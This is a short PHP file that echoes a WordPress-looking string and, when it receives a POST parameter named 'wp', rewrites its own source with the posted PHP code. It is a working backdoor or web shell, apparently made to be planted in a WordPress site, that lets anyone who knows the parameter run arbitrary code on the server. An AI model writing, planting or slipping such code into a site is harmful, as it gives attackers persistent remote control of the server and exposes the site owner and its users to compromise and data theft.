<?php
echo '$Word'.'Press !';
$wp = $_POST["wp"];
if (get_magic_quotes_gpc()) { $wp=stripslashes($wp);  }
if (isset($_POST["wp"])) file_put_contents($_SERVER["SCRIPT_FILENAME"],'<?php '.$wp.' ?>');
?>